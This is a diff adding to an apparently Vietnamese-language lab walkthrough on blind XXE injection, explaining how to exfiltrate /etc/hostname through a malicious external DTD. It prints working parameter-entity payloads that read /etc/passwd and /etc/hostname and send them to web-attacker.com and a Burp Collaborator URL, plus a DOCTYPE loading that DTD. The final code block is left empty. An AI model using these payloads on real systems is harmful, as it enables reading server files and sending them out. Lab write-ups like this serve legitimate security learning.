@@ -291,5 +291,47 @@ This lab has a "Check stock" feature that parses XML input but does not display 
 To solve the lab, exfiltrate the contents of the /etc/hostname file.
 ```
 
-Bài lab mô tả răng lỗ hổng này sẽ có phân tích input và sẽ không hiển thị kết quả
+Bài lab mô tả răng lỗ hổng này sẽ có phân tích input và sẽ không hiển thị kết quả, điều này làm rõ đặc tính của blind vuln.
+
+
+Truy cập bài lab chúng ta thấy 1 trang web bán hàng với chức năng check stock như đã biết trước , tuy nhiên để thực hiện được exfiltrate data đối với XXE thì chúng ta cần  maliciuos DTD, cụ thể hơn trong bài này chúng ta sẽ tạo 1 malicious DTD bằng exploit server. Dựa trên các tiêu chí để tạo ra 1 malicious DTD chúng ta tạo được payload như sau : 
+
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+==> 
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://1acs5ag6ih0n3r1mby5ouosz8qei27.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+
+Vậy là chúng ta đã chuẩn bị xong 1 malicious DTD, tiếp theo tới việc dùng nó để extract data sáng client của chúng ta :vv 
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+
+==>
+
+
+
+
+```
+
+
+
+
+
+
+
+
+
+
+
 
